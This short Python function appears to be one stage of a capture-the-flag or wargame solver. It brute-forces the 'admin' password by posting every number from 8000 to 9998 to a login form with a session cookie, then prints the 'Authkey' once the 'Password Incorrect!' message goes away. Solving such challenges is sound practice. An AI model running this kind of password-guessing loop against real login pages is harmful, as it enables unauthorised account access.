def part5(session, URL, cookie):
    for i in range(8000, 9999) :
        data5={
            "id":"admin",
            "pw":i
           }

        req5=session.post(URL, cookies=cookie, data=data5)
        if (req5.text.find("Password Incorrect!") == -1 ) :
            index=req5.text.find("Authkey")
            print ("\n\n")
            print (req5.text[index:index+30])
            print ("\n\n")
            input("Press Any KEY to exit......")
            exit (0)
#        else :
#            print ("proc 5")
